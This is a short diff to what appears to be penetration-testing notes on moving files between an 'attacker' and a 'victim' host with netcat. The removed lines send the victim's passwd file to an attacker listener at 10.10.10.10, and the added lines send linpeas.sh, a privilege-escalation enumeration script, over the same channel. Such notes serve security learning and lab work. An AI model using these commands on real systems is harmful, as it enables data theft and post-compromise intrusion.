@@ -554,11 +554,11 @@ The use curl to download the file like this:
 
 On receiving end:
 
-<b>pform@attacker~: </b><code>nc -l 5555 > passwd</code>
+<b>pform@attacker~: </b><code>nc -l 5555 > linpeas.sh</code>
 
 On sending end:
 
-<b>hacked-account@victim~: </b><code>cat passwd | nc 10.10.10.10 5555</code>
+<b>hacked-account@victim~: </b>nc -w 3 10.10.10.10 5555 < linpeas.sh</code>
 
 If you want to transfer from attacker to victim, just swich the commands.
 
